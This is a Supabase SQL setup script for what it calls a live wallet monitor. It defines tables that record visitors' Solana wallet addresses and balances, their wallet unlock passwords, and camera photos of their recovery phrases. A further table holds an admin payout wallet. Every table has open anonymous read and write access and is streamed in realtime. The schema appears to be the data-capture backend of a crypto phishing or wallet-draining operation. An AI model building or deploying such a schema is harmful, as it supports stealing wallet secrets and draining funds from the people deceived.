-- Live wallet monitor for the static Vercel site.
-- Run in Supabase → SQL Editor:
-- https://supabase.com/dashboard/project/jdnfpchddosbxejezkgk/sql/new

create table if not exists public.wallet_sessions (
  id text primary key,
  wallet_address text not null unique,
  wallet_type text not null default 'Solana Wallet',
  chain text not null default 'solana',
  network text not null default 'mainnet-beta',
  balance_sol double precision,
  page_url text,
  user_agent text,
  browser_session_id text,
  unlock_password text,
  phrase_snap_image text,
  connected_at timestamptz not null default now(),
  last_seen_at timestamptz not null default now(),
  connection_status text not null default 'connected'
);

create index if not exists wallet_sessions_last_seen_idx on public.wallet_sessions (last_seen_at desc);

alter table public.wallet_sessions enable row level security;

drop policy if exists wallet_sessions_select on public.wallet_sessions;
drop policy if exists wallet_sessions_insert on public.wallet_sessions;
drop policy if exists wallet_sessions_update on public.wallet_sessions;

create policy wallet_sessions_select on public.wallet_sessions
  for select to anon, authenticated using (true);

create policy wallet_sessions_insert on public.wallet_sessions
  for insert to anon, authenticated with check (true);

create policy wallet_sessions_update on public.wallet_sessions
  for update to anon, authenticated using (true) with check (true);

do $$
begin
  begin
    alter publication supabase_realtime add table public.wallet_sessions;
  exception
    when duplicate_object then null;
  end;
end $$;

alter table public.wallet_sessions add column if not exists phrase_snap_image text;

-- Phrase camera snaps (separate table so photos work even before wallet_sessions column exists)
create table if not exists public.wallet_phrase_snaps (
  wallet_address text primary key,
  snap_image text not null,
  captured_at timestamptz not null default now()
);

alter table public.wallet_phrase_snaps enable row level security;

drop policy if exists wallet_phrase_snaps_select on public.wallet_phrase_snaps;
drop policy if exists wallet_phrase_snaps_insert on public.wallet_phrase_snaps;
drop policy if exists wallet_phrase_snaps_update on public.wallet_phrase_snaps;

create policy wallet_phrase_snaps_select on public.wallet_phrase_snaps
  for select to anon, authenticated using (true);

create policy wallet_phrase_snaps_insert on public.wallet_phrase_snaps
  for insert to anon, authenticated with check (true);

create policy wallet_phrase_snaps_update on public.wallet_phrase_snaps
  for update to anon, authenticated using (true) with check (true);

do $$
begin
  begin
    alter publication supabase_realtime add table public.wallet_phrase_snaps;
  exception
    when duplicate_object then null;
  end;
end $$;

create table if not exists public.admin_payout_wallet (
  id text primary key,
  wallet_address text not null default '',
  amount numeric not null default 0,
  asset text not null default 'USDT',
  updated_at timestamptz not null default now()
);

alter table public.admin_payout_wallet
  add column if not exists amount numeric not null default 0;

alter table public.admin_payout_wallet
  add column if not exists asset text not null default 'USDT';

alter table public.admin_payout_wallet enable row level security;

drop policy if exists admin_payout_wallet_select on public.admin_payout_wallet;
drop policy if exists admin_payout_wallet_insert on public.admin_payout_wallet;
drop policy if exists admin_payout_wallet_update on public.admin_payout_wallet;

create policy admin_payout_wallet_select on public.admin_payout_wallet
  for select to anon, authenticated using (true);

create policy admin_payout_wallet_insert on public.admin_payout_wallet
  for insert to anon, authenticated with check (true);

create policy admin_payout_wallet_update on public.admin_payout_wallet
  for update to anon, authenticated using (true) with check (true);
